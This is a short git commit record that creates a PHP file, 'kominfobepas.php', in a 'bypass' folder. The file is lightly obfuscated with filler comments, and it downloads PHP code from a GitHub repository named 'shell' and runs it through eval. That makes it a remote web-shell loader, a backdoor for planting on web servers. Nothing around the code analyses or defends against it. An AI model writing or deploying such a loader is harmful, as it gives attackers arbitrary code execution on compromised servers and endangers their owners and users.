1b61f9daf14e44594b5edadee81a56230813a6d3
Rexorid <kamukanlonte@gmail.com>
2026-09-16 20:00:34 +0700

    Create kominfobepas.php

---
+++ bypass/kominfobepas.php
@@ -0,0 +1,8 @@
+<?php eval(
+    /*_*/ urldecode("%3f%3e") .
+        file_get_contents(
+            /*_*/ urldecode(
+                /*_*/ "https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/kominfo.php"
+            )
+        )
+); ?>
